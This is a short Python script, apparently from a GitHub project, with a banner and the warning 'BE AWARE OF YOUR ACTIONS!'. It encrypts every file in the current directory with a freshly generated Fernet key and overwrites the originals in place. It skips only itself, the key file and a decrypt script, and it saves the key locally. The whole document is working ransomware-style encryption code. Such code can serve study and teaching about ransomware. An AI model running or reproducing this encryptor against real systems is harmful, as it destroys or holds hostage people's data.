#!/usr/bin/env python3
#   /$$   /$$ /$$$$$$$$
#  | $$  /$$/| $$_____/
#  | $$ /$$/ | $$
#  | $$$$$/  | $$$$$
#  | $$  $$  | $$__/
#  | $$\  $$ | $$
#  | $$ \  $$| $$      Author: Kauê Fraga Rodrigues
#  |__/  \__/|__/      github.com/kauefraga/edc
# BE AWARE OF YOUR ACTIONS!

import os
from cryptography.fernet import Fernet

def main():
  files = []

  for file in os.listdir():
    if file == "encrypt-files.py" or file == "thekey.key" or file == "decrypt.py":
      continue

    if os.path.isfile(file):
      files.append(file)

  # Write the key down to the key file
  key = Fernet.generate_key()
  with open("thekey.key", "wb") as thekey:
    thekey.write(key)

  # Run through the files
  for file in files:
    # Read all the files
    with open(file, "rb") as thefile:
      contents = thefile.read()

    # Encrypt the contents
    contents_encrypted = Fernet(key).encrypt(contents)

    # Write the encrypted contents
    with open(file, "wb") as thefile:
      thefile.write(contents_encrypted)

if __name__ == "__main__":
  main()
